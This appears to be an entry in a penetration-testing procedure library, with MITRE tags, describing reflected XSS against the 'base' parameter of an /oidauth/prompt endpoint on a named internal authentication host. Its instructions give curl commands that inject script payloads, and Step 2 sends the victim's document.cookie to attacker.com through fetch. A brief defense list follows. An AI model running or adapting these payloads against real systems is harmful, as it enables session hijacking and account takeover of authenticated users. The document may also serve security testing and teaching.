---
id: proc-test-xss-payload-326449
tags:
  - xss
  - payload-testing
  - javascript-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:34.240Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Test-Reflected-XSS-Payload

## Summary

This procedure tests JavaScript payload injection into the 'base' parameter of the /oidauth/prompt endpoint to confirm reflected XSS execution upon user interaction, such as a click.

## Description

The vulnerability allows arbitrary JavaScript to be reflected into the page body. By injecting a payload like <script>alert('XSS')</script>, the script executes in the authenticated user's browser context when the page loads and the user interacts. This can lead to stealing session cookies via document.cookie. The test requires browser execution, as reflection is client-side.

## Requirements

1. Vulnerable endpoint access
2. Browser for payload execution
3. Proxy for request interception if needed

## Defense

Defensive measures and detection strategies:

- Sanitize 'base' parameter with HTML entity encoding
- Add CSP with 'unsafe-inline' restrictions
- Log and alert on script tags in parameters

## Objectives

1. Verify payload reflection and execution
2. Assess execution context (authenticated user)
3. Identify interaction requirements (e.g., click)

## Instructions

### Step 1: Inject Basic Payload

**Context**: Craft a URL with XSS payload in 'base' and load in browser to test execution.

**Command** ([[commands/curl-xss-payload]]):
```bash
curl -G "https://auth.uberinternal.com/oidauth/prompt" --data-urlencode "base=<script>alert('XSS')</script>" -v
```

> Copy the response URL to browser; upon load and click, an alert should pop confirming execution.

### Step 2: Test Malicious Payload

**Context**: Use a payload to exfiltrate data, verifying impact.

**Command** ([[commands/curl-xss-payload]]):
```bash
curl -G "https://auth.uberinternal.com/oidauth/prompt" --data-urlencode "base=<script>fetch('https://attacker.com?cookie='+document.cookie)</script>" -v
```

> In browser, check network tab for request to attacker server with cookie data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[payload-testing]]
